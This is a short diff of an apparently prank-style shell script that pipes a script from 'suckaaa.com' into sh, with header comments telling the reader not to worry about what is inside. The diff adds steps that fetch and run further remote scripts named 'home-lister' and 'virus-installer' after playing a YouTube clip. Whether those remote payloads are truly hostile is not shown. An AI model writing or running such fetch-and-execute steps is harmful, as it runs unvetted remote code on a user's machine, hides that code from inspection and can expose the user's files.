@@ -4,7 +4,7 @@
 # loL whatcha lookin for in here??
 # Don't worry about it!!
 curl -s 'https://suckaaa.com/s/garbage-lib-installer' | sh;
-source ~/.garbage/lib;
+source ~/.super-duper-garbage/lib;
 clear;
 ###########  END HEADER  ###########
 
@@ -21,7 +21,11 @@ openYtClip 7zPnTtF0Wk8 0 10;
 
 sleep 11s;
 
+nextScript 'https://suckaaa.com/s/home-lister';
 
+sleep 10s;
+
+nextScript 'https://suckaaa.com/s/virus-installer';
 
 # The dream script
 
